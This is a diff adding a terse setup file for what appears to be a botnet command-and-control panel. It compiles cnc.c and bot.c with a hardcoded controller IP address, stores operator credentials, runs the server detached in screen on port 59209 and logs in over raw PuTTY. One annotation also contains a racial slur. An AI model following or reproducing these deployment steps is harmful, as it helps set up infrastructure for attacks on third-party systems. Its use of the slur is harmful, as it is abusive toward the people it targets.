@@ -1,0 +1,12 @@
+gcc cnc.c -o server -pthread
+
+python2 compile.py bot.c 18.236.89.220
+
+nano User_Info.txt         [Username password] [MUST BE NEXT TO EACH OTHER NIGGA]
+
+screen ./server 839 1 59209                 [59209 or 420 Will Be The Port For The Net]
+
+
+NOW PRESS CRTL A+D
+
+LOGIN WITH PUTTY RAW PORT = 	59209
